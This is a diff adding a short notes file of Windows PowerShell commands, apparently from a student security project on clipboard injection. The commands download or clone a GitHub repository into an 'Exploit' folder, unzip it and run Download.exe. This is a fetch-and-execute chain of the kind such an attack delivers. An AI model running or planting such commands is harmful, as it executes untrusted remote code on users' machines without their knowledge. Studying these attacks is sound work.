@@ -1,0 +1,22 @@
+1. git clone https://github.com/flaque/comp-security-project
+2. cd .\comp-security-project\
+3. cd .\ClipboardInjections\
+4. cd dist
+5. .\Download.exe 
+
+
+1. wget https://api.github.com/repos/Flaque/comp-security-project/zipball/master -OutFile comp-security-project-master.zip
+
+
+2. 
+$shell = New-Object -ComObject shell.application
+$zip = $shell.NameSpace("C:\Users\Maxwell Dulin\Desktop\Exploit\comp-security-project-master.zip")
+foreach ($item in $zip.items()) {
+  $shell.Namespace("C:\Users\Maxwell Dulin\Desktop\Exploit").CopyHere($item)
+}
+
+
+3. cd .\Flaque-comp-security-project-04b9203\ClipboardInjections\dist; .\Download.exe
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile(“https://api.github.com/repos/Flaque/comp-security-project/zipball/master”,“C:\Users\Maxwell Dulin\Desktop\Exploit\comp-security-project-master.zip”)
